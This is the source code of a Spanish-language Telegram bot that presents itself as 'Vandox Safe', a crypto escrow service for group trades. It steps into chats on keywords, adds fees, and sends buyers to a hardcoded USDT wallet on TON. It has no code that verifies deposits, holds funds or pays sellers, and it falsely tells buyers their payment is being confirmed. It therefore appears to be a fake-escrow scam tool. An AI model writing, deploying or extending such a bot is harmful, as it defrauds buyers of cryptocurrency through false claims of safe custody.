const { Telegraf, Markup } = require('telegraf');

const bot = new Telegraf(process.env.BOT_TOKEN);

// Base de datos temporal para las transacciones del grupo
let transaccionesGrupo = {};

// --- FUNCIÓN DE BIENVENIDA ---
const bienvenidaVandox = (ctx) => {
    return ctx.replyWithMarkdown(
        `🛡️ *Vandox Safe: Bóveda de Seguridad*\n\n` +
        `Detecto una operación en curso. Soy vuestro notario digital para asegurar que el intercambio sea 100% seguro.\n\n` +
        `¿Qué tipo de trato vais a realizar?`,
        Markup.inlineKeyboard([
            [Markup.button.callback('💰 Iniciar Venta (Escrow)', 'nuevo_escrow')],
            [Markup.button.callback('🤝 Iniciar Trueque (Swap)', 'nuevo_swap')],
            [Markup.button.callback('📊 Ver Tarifas', 'ver_tarifas')]
        ])
    );
};

// --- LÓGICA DE MENSAJES ---
bot.on('message', (ctx) => {
    const text = ctx.message.text;
    const chatId = ctx.chat.id;

    if (ctx.chat.type === 'group' || ctx.chat.type === 'supergroup') {
        // Salto automático con palabras clave
        const disparadores = ['hola', 'vendo', 'compro', 'precio', 'pago', 'deal', 'swap'];
        if (text && disparadores.some(p => text.toLowerCase().includes(p))) {
            return bienvenidaVandox(ctx);
        }

        // Procesar el precio cuando el vendedor lo escribe
        if (transaccionesGrupo[chatId]?.esperandoPrecio) {
            const monto = parseFloat(text.replace(',', '.'));
            if (isNaN(monto)) return ctx.reply("❌ Por favor, escribe solo el número del precio (ej: 50).");

            // Cálculo: $2.00 mínimo o 3% si es mayor a $65
            let comision = monto < 65 ? 2.00 : monto * 0.03;
            const total = monto + comision;

            transaccionesGrupo[chatId] = { monto, comision, etapa: 'confirmacion' };

            return ctx.replyWithMarkdown(
                `📦 *Recibo de Transacción Vandox*\n\n` +
                `💵 **Monto del producto:** $${monto.toFixed(2)}\n` +
                `🛡️ **Comisión de Seguridad:** $${comision.toFixed(2)}\n` +
                `💳 **Total a depositar:** $${total.toFixed(2)}\n\n` +
                `⚠️ *Atención Comprador:* ¿Aceptas estas condiciones para proceder al pago seguro en custodia?`,
                Markup.inlineKeyboard([
                    [Markup.button.callback('✅ Aceptar y Pagar', 'aceptar_pago')],
                    [Markup.button.callback('❌ Cancelar', 'cancelar')]
                ])
            );
        }
    }

    // Menú privado
    if (ctx.chat.type === 'private' && text === '/start') {
        ctx.replyWithMarkdown('🛡️ *Vandox Safe Bot*\nSelecciona tu idioma:', Markup.inlineKeyboard([
            [Markup.button.callback('Español 🇪🇸', 'lang_es'), Markup.button.callback('English 🇺🇸', 'lang_en')]
        ]));
    }
});

// --- ACCIONES DE BOTONES ---

bot.action('nuevo_escrow', (ctx) => {
    transaccionesGrupo[ctx.chat.id] = { esperandoPrecio: true };
    ctx.reply('✍️ *Vendedor:* Por favor, escribe el precio del producto en USD:');
});

bot.action('aceptar_pago', (ctx) => {
    ctx.replyWithMarkdown(
        `🏦 *Pasarela de Pago Segura Vandox*\n\n` +
        `Para iniciar la custodia, realiza el depósito en la siguiente dirección:\n\n` +
        `💎 *OPCIÓN RECOMENDADA:* (Casi sin comisiones)\n` +
        `📍 Red: **USDT (TON / Telegram)**\n` +
        `💳 Billetera: \`UQAfvihg2RIt_PFSTfBOYLYC-8ABrUd1IbAxUItFAOVmc8lH\`\n\n` +
        `🌐 *OPCIÓN ALTERNATIVA:*\n` +
        `📍 Red: **USDT (TRC-20 / Tron)**\n` +
        `💳 Billetera: \`TU_BILLETERA_TRC20_AQUI\`\n\n` +
        `Una vez realizado el envío, pulsa el botón de abajo para verificar.`,
        Markup.inlineKeyboard([
            [Markup.button.callback('✅ Ya he realizado el pago', 'pago_enviado')]
        ])
    );
});

bot.action('ver_tarifas', (ctx) => {
    ctx.replyWithMarkdown(
        `📊 *Tarifas de Protección Vandox:*\n\n` +
        `• Ventas menores a $65: **$2.00 fijos**\n` +
        `• Ventas mayores a $65: **3% del total**\n` +
        `• Trueques (Swap): **$2.00 fijos**\n\n` +
        `_Usar la red TON te ahorra $1.00 de comisión de red extra._`
    );
});

bot.action('pago_enviado', (ctx) => {
    ctx.reply("📨 *Aviso recibido.* Estamos confirmando el depósito en la red. En unos minutos notificaremos al vendedor para que entregue el producto. 🛡️");
});

bot.action('cancelar', (ctx) => {
    delete transaccionesGrupo[ctx.chat.id];
    ctx.reply("❌ Operación cancelada.");
});

bot.launch();
